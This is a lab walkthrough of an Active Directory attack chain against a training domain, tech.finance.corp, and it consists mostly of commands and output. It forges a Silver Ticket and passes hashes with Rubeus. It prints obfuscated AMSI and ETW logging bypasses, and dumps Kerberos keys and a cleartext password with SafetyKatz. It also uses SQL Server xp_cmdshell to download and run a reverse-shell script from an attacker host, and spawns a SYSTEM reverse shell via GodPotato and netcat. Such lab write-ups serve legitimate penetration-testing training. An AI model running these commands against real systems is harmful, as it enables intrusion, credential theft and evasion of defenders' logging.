### Domain Persistence | Silver Ticket (with Rubeus)

6) **Silver Ticket Attack for Domain Persistence** (successful ✅)

Description: Leveraged the **RC4 Kerberos key** extracted from `mgmtsrv` to forge a **Silver Ticket** for the `http/mgmtsrv.tech.finance.corp` service. The ticket was generated using `Rubeus` and injected into the current session, granting **administrator-level access** to `mgmtsrv` **without requiring authentication from the Domain Controller**. This technique enables **persistence and stealthy access** to the target machine, bypassing standard Kerberos authentication mechanisms.

![studvm | studentuser $>](https://custom-icon-badges.demolab.com/badge/studvm-studentuser%20[%24>]-64b5f6?logo=windows11&logoColor=white)

`C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args evasive-silver /service:http/mgmtsrv.tech.finance.corp /rc4:207218a0920d00bbbd4daa22f6e767d3 /sid:S-1-5-21-1325336202-3661212667-302732393 /ldap /user:administrator /domain:tech.finance.corp /ptt`:
```
[SNIP]

[*] Action: Build TGS📌

[SNIP]

[*] Domain         : TECH.FINANCE.CORP🏛️ (TECH)
[*] SID            : S-1-5-21-1325336202-3661212667-302732393
[*] UserId         : 1109
[*] Groups         : 513
[*] ServiceKey     : 207218A0920D00BBBD4DAA22F6E767D3
[*] ServiceKeyType : KERB_CHECKSUM_HMAC_MD5
[*] KDCKey         : 207218A0920D00BBBD4DAA22F6E767D3
[*] KDCKeyType     : KERB_CHECKSUM_HMAC_MD5
[*] Service        : http📌
[*] Target         : mgmtsrv🖥️.tech.finance.corp

[*] Generating EncTicketPart
[*] Signing PAC
[*] Encrypting EncTicketPart
[*] Generating Ticket
[*] Generated KERB-CRED
[*] Forged a TGS for 'administrator'🎭 to 'http/mgmtsrv.tech.finance.corp'

[*] AuthTime       : 3/11/2025 9:51:08 AM
[*] StartTime      : 3/11/2025 9:51:08 AM
[*] EndTime        : 3/11/2025 7:51:08 PM
[*] RenewTill      : 3/18/2025 9:51:08 AM

[*] base64(ticket.kirbi):

[SNIP]

[+] Ticket successfully imported!🎟️
```

`klist`:
```
Current LogonId is 0:0x13e557

Cached Tickets: (1)

#0>     Client: administrator🎭 @ TECH.FINANCE.CORP🏛️
        Server: http📌/mgmtsrv🖥️.tech.finance.corp @ TECH.FINANCE.CORP
        KerbTicket Encryption Type: RSADSI RC4-HMAC(NT)
        Ticket Flags 0x40a00000 -> forwardable renewable pre_authent
        Start Time: 3/11/2025 9:51:08 (local)
        End Time:   3/11/2025 19:51:08 (local)
        Renew Time: 3/18/2025 9:51:08 (local)
        Session Key Type: RSADSI RC4-HMAC(NT)
        Cache Flags: 0
        Kdc Called:
```

`winrs -r:mgmtsrv.tech.finance.corp cmd`:
```
Microsoft Windows [Version 10.0.17763.2452]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Users\Administrator.TECH>
```
🚀

![mgmtsrv | administrator #>](https://custom-icon-badges.demolab.com/badge/mgmtsrv-administrator%20[%23>]-64b5f6?logo=windows11&logoColor=white)

`set username`:
```
USERNAME=Administrator👤
```

`set computername`:
```
COMPUTERNAME=MGMTSRV🖥️
```
🚩

---

### Domain Lateral Movement | OverPass-The-Hash (with Rubeus)

7) **OverPass-The-Hash for Domain Lateral Movement** (successful ✅)

Description: Used the **AES-256 Kerberos Key** of `techservice`, extracted in a previous step, to request a **TGT (Ticket Granting Ticket)** without needing the user's password. This was achieved using `Rubeus` to perform an **OverPass-The-Hash attack**. The obtained ticket was injected into a **new logon session**, allowing authenticated access as `techservice` and enabling lateral movement to `techsrv30.tech.finance.corp`.

![studvm | studentuser #>](https://custom-icon-badges.demolab.com/badge/studvm-studentuser%20[%23>]-64b5f6?logo=windows11&logoColor=white)

`C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:techservice /aes256:7f6825f607e9474bcd6b9c684dc70f7c1ca977ade7bfd2ad152fd54968349deb /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt`:
```
[SNIP]

[*] Action: Ask TGT📌

[*] Got domain: tech.finance.corp
[*] Showing process : True
[*] Username        : 04ZH8ONJ
[*] Domain          : 4UIN93E5
[*] Password        : UOZK2GE6
[+] Process         : 'C:\Windows\System32\cmd.exe' successfully created with LOGON_TYPE = 9
[+] ProcessID       : 3324
[+] LUID            : 0x5dbd08

[*] Using domain controller: tech-dc.tech.finance.corp (172.16.4.1)
[!] Pre-Authentication required!
[!]     AES256 Salt: TECH.FINANCE.CORPtechservice
[*] Using aes256_cts_hmac_sha1 hash: 7f6825f607e9474bcd6b9c684dc70f7c1ca977ade7bfd2ad152fd54968349deb
[*] Building AS-REQ (w/ preauth) for: 'tech.finance.corp\techservice'
[*] Target LUID : 6143240
[*] Using domain controller: 172.16.4.1:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

[SNIP]

[*] Target LUID: 0x5dbd08
[+] Ticket successfully imported!🎟️

  ServiceName              :  krbtgt/TECH.FINANCE.CORP
  ServiceRealm             :  TECH.FINANCE.CORP
  UserName                 :  techservice🎭 (NT_PRINCIPAL)
  UserRealm                :  TECH.FINANCE.CORP🏛️
  StartTime                :  3/11/2025 11:16:55 AM
  EndTime                  :  3/11/2025 9:16:55 PM
  RenewTill                :  3/18/2025 11:16:55 AM
  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType                  :  aes256_cts_hmac_sha1
  Base64(key)              :  rD+bz7cOAiFFiUDjDt0KMcx5KpKUFquKg7SQQswIWEs=
  ASREP (key)              :  7F6825F607E9474BCD6B9C684DC70F7C1CA977ADE7BFD2AD152FD54968349DEB
```

![New spawned terminal process 1](learning_objective_07_new_spawned_terminal_process_1.png)

`klist`:
```
Current LogonId is 0:0x5dbd08

Cached Tickets: (1)

#0>     Client: techservice🎭 @ TECH.FINANCE.CORP🏛️
        Server: krbtgt📌/TECH.FINANCE.CORP @ TECH.FINANCE.CORP
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40e10000 -> forwardable renewable initial pre_authent name_canonicalize
        Start Time: 3/11/2025 11:16:55 (local)
        End Time:   3/11/2025 21:16:55 (local)
        Renew Time: 3/18/2025 11:16:55 (local)
        Session Key Type: AES-256-CTS-HMAC-SHA1-96
        Cache Flags: 0x1 -> PRIMARY
        Kdc Called:
```

`winrs -r:techsrv30.tech.finance.corp cmd`:
```
Microsoft Windows [Version 10.0.17763.2452]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Users\techservice>
```
🚀

![techsrv30 | techservice #>](https://custom-icon-badges.demolab.com/badge/techsrv30-techservice%20[%23>]-64b5f6?logo=windows11&logoColor=white)

`set username`:
```
USERNAME=techservice👤
```

`set computername`:
```
COMPUTERNAME=TECHSRV30🖥️
```
🚩

---

### Domain Lateral Movement | Credential Extraction (with SafetyKatz)

8) **Credential Extraction for Domain Lateral Movement** (successful ✅)

Description: Executed **PowerShell logging and AMSI bypass techniques** to evade detection while performing credential extraction. Extracted **cleartext credentials** of `databaseagent` from the Windows Credential Vault and **Kerberos keys** of `TECHSRV30$` from **LSASS memory** on `techsrv30.tech.finance.corp`. These credentials will be leveraged for **lateral movement** and further privilege escalation within the domain.

- **Bypassing PowerShell Logging and AMSI for Evasion**

![techsrv30 | techservice #>](https://custom-icon-badges.demolab.com/badge/techsrv30-techservice%20[%23>]-64b5f6?logo=windows11&logoColor=white)

`powershell`

`$ExecutionContext.SessionState.LanguageMode`:
```
FullLanguage
```

```powershell
[Reflection.Assembly]::"l`o`AdwIThPa`Rti`AlnamE"(('S'+'ystem'+'.C'+'ore'))."g`E`TTYPE"(('Sys'+'tem.Di'+'agno'+'stics.Event'+'i'+'ng.EventProv'+'i'+'der'))."gET`FI`eLd"(('m'+'_'+'enabled'),('NonP'+'ubl'+'ic'+',Instance'))."seTVa`l`Ue"([Ref]."a`sSem`BlY"."gE`T`TyPE"(('Sys'+'tem'+'.Mana'+'ge'+'ment.Aut'+'o'+'mation.Tracing.'+'PSEtwLo'+'g'+'Pro'+'vi'+'der'))."gEtFIe`Ld"(('e'+'tw'+'Provid'+'er'),('N'+'o'+'nPu'+'b'+'lic,Static'))."gE`Tva`lUe"($null),0)
```

```powershell
S`eT-It`em ( 'V'+'aR' + 'IA' + (("{1}{0}"-f'1','blE:')+'q2') + ('uZ'+'x') ) ( [TYpE]( "{1}{0}"-F'F','rE' ) ) ; ( Get-varI`A`BLE ( ('1Q'+'2U') +'zX' ) -VaL )."A`ss`Embly"."GET`TY`Pe"(( "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),(("{0}{1}" -f '.M','an')+'age'+'men'+'t.'),('u'+'to'+("{0}{2}{1}" -f 'ma','.','tion')),'s',(("{1}{0}"-f 't','Sys')+'em') ) )."g`etf`iElD"( ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+("{0}{1}" -f 'ni','tF')+("{1}{0}"-f 'ile','a')) ),( "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+("{1}{0}" -f'ubl','P')+'i'),'c','c,' ))."sE`T`VaLUE"( ${n`ULl},${t`RuE} )
```

- **Extract Credentials of `databaseagent` and `TECHSRV30$` from Memory on `techsrv30.tech.finance.corp`**

![HFS - Loader.exe, SafetyKatz.exe](learning_objective_07_hfs_loader_safetykatz.png)

![techsrv30 | techservice #>](https://custom-icon-badges.demolab.com/badge/techsrv30-techservice%20[%23>]-64b5f6?logo=windows11&logoColor=white)

`iwr http://172.16.100.1/Loader.exe -OutFile C:\Users\Public\Loader.exe`

`netsh interface portproxy add v4tov4 listenport=1234 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.1`

`C:\Users\Public\Loader.exe -path http://127.0.0.1:1234/SafetyKatz.exe -args "token::elevate" "vault::cred /patch" "exit"`:
```
[SNIP]

mimikatz(commandline) # token::elevate📌

Token Id  : 0
User name :
SID name  : NT AUTHORITY\SYSTEM

596     {0;000003e7} 1 D 18459          NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Primary
 -> Impersonated !📌
 * Process Token : {0;0028c0cb} 0 D 2727993     TECH\techservice        S-1-5-21-1325336202-3661212667-302732393-1109   (09g,24p)       Primary
 * Thread Token  : {0;000003e7} 1 D 2744954     NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Impersonation (Delegation)

mimikatz(commandline) # vault::cred /patch📌

TargetName : Domain:batch=TaskScheduler:Task:{877E4326-BAD4-4516-A4B1-60C73F0EFDDA} / <NULL>
UserName   : TECH\databaseagent👤
Comment    : <NULL>
Type       : 2 - domain_password
Persist    : 2 - local_machine
Flags      : 00004004
Credential : CheckforSQLServer31-Availability🔑
Attributes : 0

[SNIP]
```

`C:\Users\Public\Loader.exe -path http://127.0.0.1:1234/SafetyKatz.exe -args "sekurlsa::evasive-keys" "exit"`:
```
[SNIP]

mimikatz(commandline) # sekurlsa::evasive-keys📌

[SNIP]

Authentication Id : 0 ; 999 (00000000:000003e7)
Session           : UndefinedLogonType from 0
User Name         : TECHSRV30$👤
Domain            : TECH
Logon Server      : (null)
Logon Time        : 3/11/2025 5:54:35 AM
SID               : S-1-5-18

         * Username : techsrv30$
         * Domain   : TECH.FINANCE.CORP
         * Password : (null)
         * Key List :
           aes256_hmac       cf9663ec900673821727858b404456a9f7c104e5a731253781e47cf601b9f747🔑
           rc4_hmac_nt       54c0572a3ddc383be81cdd37b3c8d8a6
           rc4_hmac_old      54c0572a3ddc383be81cdd37b3c8d8a6
           rc4_md4           54c0572a3ddc383be81cdd37b3c8d8a6
           rc4_hmac_nt_exp   54c0572a3ddc383be81cdd37b3c8d8a6
           rc4_hmac_old_exp  54c0572a3ddc383be81cdd37b3c8d8a6
```
🚩

---

### Domain Lateral Movement | OverPass-The-Hash (with RunAs)

9) **OverPass-The-Hash for Domain Lateral Movement** (successful ✅)

Description: Used the **cleartext credentials** of `databaseagent`, extracted in a previous step, to initiate a **net-only authentication session** with `runas`. This allowed running commands as `databaseagent` while maintaining the original user's context in the local environment. Privilege enumeration revealed that **SeDebugPrivilege** and **SeImpersonatePrivilege** were enabled, which could be leveraged for **potential privilege escalation** and further lateral movement within the domain.

![studvm | studentuser #>](https://custom-icon-badges.demolab.com/badge/studvm-studentuser%20[%23>]-64b5f6?logo=windows11&logoColor=white)

`runas /user:tech\databaseagent /netonly "powershell -Command \"Start-Process cmd -Verb RunAs\""`:
```
Enter the password for tech\databaseagent:📌
Attempting to start powershell -Command "Start-Process cmd -Verb RunAs" as user "tech\databaseagent" ...
```

![New spawned terminal process 2](./assets/screenshots/learning_objective_07_new_spawned_terminal_process_2.png)

![studvm | studentuser $>](https://custom-icon-badges.demolab.com/badge/studvm-studentuser%20[%24>]-64b5f6?logo=windows11&logoColor=white)

`whoami`:
```
tech\studentuser👤
```

`hostname`:
```
studvm🖥️
```

`whoami /groups`:
```
ERROR: Unable to get group membership information.
```
❌

`whoami /priv`:
```
PRIVILEGES INFORMATION
----------------------

Privilege Name                            Description                                                        State
========================================= ================================================================== ========

[SNIP]

SeDebugPrivilege📑                        Debug programs                                                     Enabled✅
SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Disabled
SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled
SeRemoteShutdownPrivilege                 Force shutdown from a remote system                                Disabled
SeUndockPrivilege                         Remove computer from docking station                               Disabled
SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Disabled
SeImpersonatePrivilege📑                  Impersonate a client after authentication            Enabled✅
SeCreateGlobalPrivilege                   Create global objects                                              Enabled

[SNIP]
```

---

### Cross Trust Attacks | SQL Server Links Abuse (with PowerUpSQL, Invoke-PowerShellTcpEx)

10) **SQL Server Links Abuse for Domain Lateral Movement** (successful ✅)

Description: Abused **SQL Server Linked Server functionality** to perform **lateral movement** within the domain. First, identified a target SQL Server (`dbserver31.tech.finance.corp`) where the user `databaseagent` had **authentication rights** and was a **sysadmin**. Then, validated the ability to execute commands on a linked SQL Server using `xp_cmdshell`. Finally, a reverse shell was obtained by executing a **PowerShell script** on the target server, successfully establishing a foothold on `dbserver31.tech.finance.corp` as `sqlserversync`. This allows further **privilege escalation** and post-exploitation actions within the domain.

- **Identify a Target SQL Server where we have Authentication Rights**

![studvm | studentuser $>](https://custom-icon-badges.demolab.com/badge/studvm-studentuser%20[%24>]-64b5f6?logo=windows11&logoColor=white)

`C:\AD\Tools\InviShell\RunWithPathAsAdmin.bat`:
```
[SNIP]
```

`Import-Module C:\AD\Tools\PowerUpSQL-master\PowerUpSQL.psd1`

`Get-SQLInstanceDomain | Get-SQLServerinfo -Verbose`:
```
ComputerName           : dbserver31.tech.finance.corp📌
Instance               : DBSERVER31🖥️
DomainName             : TECH🏛️
ServiceProcessID       : 2316
ServiceName            : MSSQLSERVER🗄️
ServiceAccount         : tech\sqlserversync
AuthenticationMode     : Windows and SQL Server Authentication
ForcedEncryption       : 0
Clustered              : No
SQLServerVersionNumber : 15.0.2000.5
SQLServerMajorVersion  : 2019
SQLServerEdition       : Developer Edition (64-bit)
SQLServerServicePack   : RTM
OSArchitecture         : X64
OsMachineType          : ServerNT
OSVersionName          : Windows Server 2019 Datacenter
OsVersionNumber        : SQL
Currentlogin           : TECH\databaseagent👤
IsSysadmin             : Yes📌
ActiveSessions         : 1
```

`klist`:
```
Current LogonId is 0:0x87a2d7

Cached Tickets: (2)

#0>     Client: databaseagent🎭 @ TECH.FINANCE.CORP🏛️
        Server: krbtgt📌/TECH.FINANCE.CORP @ TECH.FINANCE.CORP
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40e10000 -> forwardable renewable initial pre_authent name_canonicalize
        Start Time: 3/11/2025 14:53:02 (local)
        End Time:   3/12/2025 0:53:02 (local)
        Renew Time: 3/18/2025 14:53:02 (local)
        Session Key Type: AES-256-CTS-HMAC-SHA1-96
        Cache Flags: 0x1 -> PRIMARY
        Kdc Called: TECH-DC

#1>     Client: databaseagent🎭 @ TECH.FINANCE.CORP🏛️
        Server: ldap📌/tech-dc🖥️.tech.finance.corp @ TECH.FINANCE.CORP
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40a50000 -> forwardable renewable pre_authent ok_as_delegate name_canonicalize
        Start Time: 3/11/2025 14:53:02 (local)
        End Time:   3/12/2025 0:53:02 (local)
        Renew Time: 3/18/2025 14:53:02 (local)
        Session Key Type: AES-256-CTS-HMAC-SHA1-96
        Cache Flags: 0
        Kdc Called: tech-dc.tech.finance.corp
```

- **Enumerate Linked Servers on the Target SQL Server**

`Get-SQLServerLinkCrawl -Instance 'dbserver31.tech.finance.corp' -Verbose`:
```
VERBOSE: dbserver31.tech.finance.corp : Connection Success.
VERBOSE: dbserver31.tech.finance.corp : Connection Success.
VERBOSE: --------------------------------
VERBOSE:  Server: DBSERVER31🖥️
VERBOSE: --------------------------------
VERBOSE:  - Link Path to server: DBSERVER31🔗
VERBOSE:  - Link Login: TECH\databaseagent👤
VERBOSE:  - Link IsSysAdmin: 1📌
VERBOSE:  - Link Count: 0
VERBOSE:  - Links on this server:


Version     : SQL Server 2019
Instance    : DBSERVER31🖥️
CustomQuery :
Sysadmin    : 1📌
Path        : {DBSERVER31}
User        : TECH\databaseagent👤
Links       :
```

- **Validate Command Execution on a Linked SQL Server**

`Get-SQLServerLinkCrawl -Instance 'dbserver31.tech.finance.corp' -Query "exec master..xp_cmdshell 'set username'"`:
```
Version     : SQL Server 2019
Instance    : DBSERVER31
CustomQuery : {USERNAME=sqlserversync, }📌
Sysadmin    : 1
Path        : {DBSERVER31}
User        : TECH\databaseagent
Links       :
```

- **Obtain a Reverse Shell Executing a PowerShell Script on the Target SQL Server**

![studvm | studentuser $>](https://custom-icon-badges.demolab.com/badge/studvm-studentuser%20[%24>]-64b5f6?logo=windows11&logoColor=white)

`C:\AD\Tools\nc64.exe -lvp 443`:
```
listening on [any] 443 ...

[...]
```

![Invoke-PowerShellTcpEx.ps1](./assets/screenshots/learning_objective_22_invokepowershelltcpex.png)

`Get-SQLServerLinkCrawl -Instance 'dbserver31.tech.finance.corp' -Query 'exec master..xp_cmdshell ''powershell -c "iex (iwr -UseBasicParsing http://172.16.100.1/sbloggingbypass.txt);iex (iwr -UseBasicParsing http://172.16.100.1/amsibypass.txt);iex (iwr -UseBasicParsing http://172.16.100.1/Invoke-PowerShellTcpEx.ps1)"''' -QueryTarget 'dbserver31'`

![studvm | studentuser $>](https://custom-icon-badges.demolab.com/badge/studvm-studentuser%20[%24>]-64b5f6?logo=windows11&logoColor=white)

```
[...]

172.16.6.31: inverse host lookup failed: h_errno 11004: NO_DATA
connect to [172.16.100.1] from (UNKNOWN) [172.16.6.31] 49747: NO_DATA
Windows PowerShell running as user sqlserversync on DBSERVER31
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\Windows\system32>
```
🚀

![sqlserversync | dbserver31 $>](https://custom-icon-badges.demolab.com/badge/sqlserversync-dbserver31%20[%24>]-64b5f6?logo=windows11&logoColor=white)

`$env:username`:
```
tech\sqlserversync👤
```

`$env:computername`:
```
DBSERVER31🖥️
```

`whoami /priv`:
```
PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
SeImpersonatePrivilege📑      Impersonate a client after authentication Enabled✅
SeCreateGlobalPrivilege       Create global objects                     Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```
🚩

---

### Domain Lateral Movement | Credential Extraction (with SafetyKatz)

11) **Credential Extraction for Domain Lateral Movement** (unsuccessful ❌)

Description: Attempted to extract **credentials** from `dbserver31.tech.finance.corp` using **SafetyKatz**, but the operation failed due to insufficient privileges. Since the session was **not running in high integrity**, access to the LSASS process was restricted. This failure highlights the necessity of obtaining elevated privileges before attempting credential extraction.

![sqlserversync | dbserver31 $>](https://custom-icon-badges.demolab.com/badge/sqlserversync-dbserver31%20[%24>]-64b5f6?logo=windows11&logoColor=white)

![HFS - Loader.exe, SafetyKatz.exe](learning_objective_07_hfs_loader_safetykatz.png)

`iex (iwr -UseBasicParsing http://172.16.100.1/sbloggingbypass.txt)`

`iex (iwr -UseBasicParsing http://172.16.100.1/amsibypass.txt)`

`iwr http://172.16.100.1/Loader.exe -OutFile C:\Users\Public\Loader.exe`

`iwr http://172.16.100.1/SafetyKatz.exe -OutFile C:\Users\Public\SafetyKatz.exe`

`C:\Users\Public\Loader.exe -path C:\Users\Public\SafetyKatz.exe -args "sekurlsa::evasive-keys" "exit"`:
```
[+] Successfully unhooked ETW!
[+++] NTDLL.DLL IS UNHOOKED!
[+++] KERNEL32.DLL IS UNHOOKED!
[+++] KERNELBASE.DLL IS UNHOOKED!
[+++] ADVAPI32.DLL IS UNHOOKED!
[+] URL/PATH : C:\Users\Public\SafetyKatz.exe Arguments :

[X] Not in high integrity, unable to grab a handle to lsass!
```
❌

---

### Local Privilege Escalation | Token Impersonation Abuse (with GodPotato)

12) **Token Impersonation for ocal Privilege Escalation** (successful ✅)

Description: Leveraged `GodPotato`, a privilege escalation exploit that abuses **Named Pipe Token Impersonation**, to obtain **SYSTEM privileges** on `dbserver31.tech.finance.corp`. A reverse shell was established to maintain access and facilitate further post-exploitation activities.

`Get-ChildItem 'HKLM:\SOFTWARE\Microsoft\NET Framework Setup\NDP\v4\Full\' | Get-ItemPropertyValue -Name Version`:
```
4.7.03190
```

`iwr http://172.16.100.1/GodPotato-NET4.exe -OutFile C:\Users\Public\GodPotato-NET4.exe`

`iwr http://172.16.100.1/nc64.exe -OutFile C:\Users\Public\nc64.exe`

![studvm | studentuser $>](https://custom-icon-badges.demolab.com/badge/studvm-studentuser%20[%24>]-64b5f6?logo=windows11&logoColor=white)

`C:\AD\Tools\nc64.exe -lvp 1337`:
```
listening on [any] 1337 ...

[...]
```

![sqlserversync | dbserver31 $>](https://custom-icon-badges.demolab.com/badge/sqlserversync-dbserver31%20[%24>]-64b5f6?logo=windows11&logoColor=white)

`C:\Users\Public\GodPotato-NET4.exe -cmd "C:\Users\Public\nc64.exe -e C:\Windows\System32\cmd.exe 172.16.100.1 1337"`

![studvm | studentuser $>](https://custom-icon-badges.demolab.com/badge/studvm-studentuser%20[%24>]-64b5f6?logo=windows11&logoColor=white)

```
[...]

172.16.6.31: inverse host lookup failed: h_errno 11004: NO_DATA
connect to [172.16.100.1] from (UNKNOWN) [172.16.6.31] 49848: NO_DATA
Microsoft Windows [Version 10.0.17763.2452]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```

![system | dbserver31 #>](https://custom-icon-badges.demolab.com/badge/sqlserversync-dbserver31%20[%23>]-64b5f6?logo=windows11&logoColor=white)

`$env:username`:
```
SYSTEM👤
```

`$env:computername`:
```
DBSERVER31🖥️
```
🚩

---

### Domain Lateral Movement | Credential Extraction (with SafetyKatz)

13) **Credential Extraction for Domain Lateral Movement** (successful ✅)

Description: Executed **PowerShell logging and AMSI bypass techniques** to evade detection while performing credential extraction. Extracted **Kerberos keys** of `sqlserversync` and `DBSERVER31$` from **LSASS memory** on `dbserver31.tech.finance.corp`. These credentials will be leveraged for **lateral movement** and further privilege escalation within the domain.

- **Bypassing PowerShell Logging and AMSI for Evasion**

![system | dbserver31 #>](https://custom-icon-badges.demolab.com/badge/sqlserversync-dbserver31%20[%23>]-64b5f6?logo=windows11&logoColor=white)

`powershell`

`$ExecutionContext.SessionState.LanguageMode`:
```
FullLanguage
```

```powershell
[Reflection.Assembly]::"l`o`AdwIThPa`Rti`AlnamE"(('S'+'ystem'+'.C'+'ore'))."g`E`TTYPE"(('Sys'+'tem.Di'+'agno'+'stics.Event'+'i'+'ng.EventProv'+'i'+'der'))."gET`FI`eLd"(('m'+'_'+'enabled'),('NonP'+'ubl'+'ic'+',Instance'))."seTVa`l`Ue"([Ref]."a`sSem`BlY"."gE`T`TyPE"(('Sys'+'tem'+'.Mana'+'ge'+'ment.Aut'+'o'+'mation.Tracing.'+'PSEtwLo'+'g'+'Pro'+'vi'+'der'))."gEtFIe`Ld"(('e'+'tw'+'Provid'+'er'),('N'+'o'+'nPu'+'b'+'lic,Static'))."gE`Tva`lUe"($null),0)
```

```powershell
S`eT-It`em ( 'V'+'aR' + 'IA' + (("{1}{0}"-f'1','blE:')+'q2') + ('uZ'+'x') ) ( [TYpE]( "{1}{0}"-F'F','rE' ) ) ; ( Get-varI`A`BLE ( ('1Q'+'2U') +'zX' ) -VaL )."A`ss`Embly"."GET`TY`Pe"(( "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),(("{0}{1}" -f '.M','an')+'age'+'men'+'t.'),('u'+'to'+("{0}{2}{1}" -f 'ma','.','tion')),'s',(("{1}{0}"-f 't','Sys')+'em') ) )."g`etf`iElD"( ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+("{0}{1}" -f 'ni','tF')+("{1}{0}"-f 'ile','a')) ),( "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+("{1}{0}" -f'ubl','P')+'i'),'c','c,' ))."sE`T`VaLUE"( ${n`ULl},${t`RuE} )
```

- **Extract Credentials of `sqlserversync` and `DBSERVER31$` from Memory on `dbserver31.tech.finance.corp`**

![system | dbserver31 #>](https://custom-icon-badges.demolab.com/badge/sqlserversync-dbserver31%20[%23>]-64b5f6?logo=windows11&logoColor=white)

`C:\Users\Public\Loader.exe -path C:\Users\Public\SafetyKatz.exe -args "sekurlsa::evasive-keys" "exit"`:
```
mimikatz(commandline) # sekurlsa::evasive-keys📌

[SNIP]

Authentication Id : 0 ; 60395 (00000000:0000ebeb)
Session           : Service from 0
User Name         : sqlserversync👤
Domain            : TECH
Logon Server      : TECH-DC
Logon Time        : 3/11/2025 12:48:28 PM
SID               : S-1-5-21-1325336202-3661212667-302732393-1111

         * Username : sqlserversync
         * Domain   : TECH.FINANCE.CORP
         * Password : (null)
         * Key List :
           aes256_hmac       9ad6e6b51e9e3c9512b3a924360f779886d7b08e6da23d01aa4f664270b7ee65🔑
           rc4_hmac_nt       c4fa140adb18d91b7ad9e2bfbc15ab0a
           rc4_hmac_old      c4fa140adb18d91b7ad9e2bfbc15ab0a
           rc4_md4           c4fa140adb18d91b7ad9e2bfbc15ab0a
           rc4_hmac_nt_exp   c4fa140adb18d91b7ad9e2bfbc15ab0a
           rc4_hmac_old_exp  c4fa140adb18d91b7ad9e2bfbc15ab0a

[SNIP]

Authentication Id : 0 ; 999 (00000000:000003e7)
Session           : UndefinedLogonType from 0
User Name         : DBSERVER31$👤
Domain            : TECH
Logon Server      : (null)
Logon Time        : 3/11/2025 12:48:27 PM
SID               : S-1-5-18

         * Username : dbserver31$
         * Domain   : TECH.FINANCE.CORP
         * Password : (null)
         * Key List :
           aes256_hmac       a10de8a9e4b5640372d19d80b47f059aae33d80d89bb444e8b3057417b2af3e7🔑
           rc4_hmac_nt       8e49721313edefc3bd96634c5920130e
           rc4_hmac_old      8e49721313edefc3bd96634c5920130e
           rc4_md4           8e49721313edefc3bd96634c5920130e
           rc4_hmac_nt_exp   8e49721313edefc3bd96634c5920130e
           rc4_hmac_old_exp  8e49721313edefc3bd96634c5920130e

[SNIP]
```
🚩

---

### Domain Persistence

#### Domain Persistence | Replication Rights Abuse + DCSync (with PowerView, Rubeus, SafetyKatz)

![Run as administrator](learning_objectives_run_as_administrator.png)

![studvm | studentuser](https://custom-icon-badges.demolab.com/badge/studvm-studentuser-64b5f6?logo=windows11&logoColor=white)

`C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:sqlserversync /aes256:9ad6e6b51e9e3c9512b3a924360f779886d7b08e6da23d01aa4f664270b7ee65 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt`:
```
[SNIP]

[*] Action: Ask TGT📌

[*] Got domain: tech.finance.corp
[*] Showing process : True
[*] Username        : T5GXXINY
[*] Domain          : SVDT1WDO
[*] Password        : WFSGH60A
[+] Process         : 'C:\Windows\System32\cmd.exe' successfully created with LOGON_TYPE = 9
[+] ProcessID       : 4176
[+] LUID            : 0xa5a8d0

[*] Using domain controller: tech-dc.tech.finance.corp (172.16.4.1)
[!] Pre-Authentication required!
[!]     AES256 Salt: TECH.FINANCE.CORPsqlserversync
[*] Using aes256_cts_hmac_sha1 hash: 9ad6e6b51e9e3c9512b3a924360f779886d7b08e6da23d01aa4f664270b7ee65
[*] Building AS-REQ (w/ preauth) for: 'tech.finance.corp\sqlserversync'
[*] Target LUID : 10856656
[*] Using domain controller: 172.16.4.1:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

[SNIP]

[*] Target LUID: 0xa5a8d0
[+] Ticket successfully imported!🎟️

  ServiceName              :  krbtgt📌/TECH.FINANCE.CORP🏛️
  ServiceRealm             :  TECH.FINANCE.CORP
  UserName                 :  sqlserversync🎭 (NT_PRINCIPAL)
  UserRealm                :  TECH.FINANCE.CORP
  StartTime                :  3/11/2025 4:46:58 PM
  EndTime                  :  3/12/2025 2:46:58 AM
  RenewTill                :  3/18/2025 4:46:58 PM
  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType                  :  aes256_cts_hmac_sha1
  Base64(key)              :  ytus0ORUsbaiJp5A0OsYlMIJtEEqYP2SnF3/dNGi+z0=
  ASREP (key)              :  9AD6E6B51E9E3C9512B3A924360F779886D7B08E6DA23D01AA4F664270B7EE65
```

![New spawned terminal process](learning_objective_12_new_spawned_terminal_process.png)

`klist`:
```
Current LogonId is 0:0xa5a8d0

Cached Tickets: (1)

#0>     Client: sqlserversync🎭 @ TECH.FINANCE.CORP🏛️
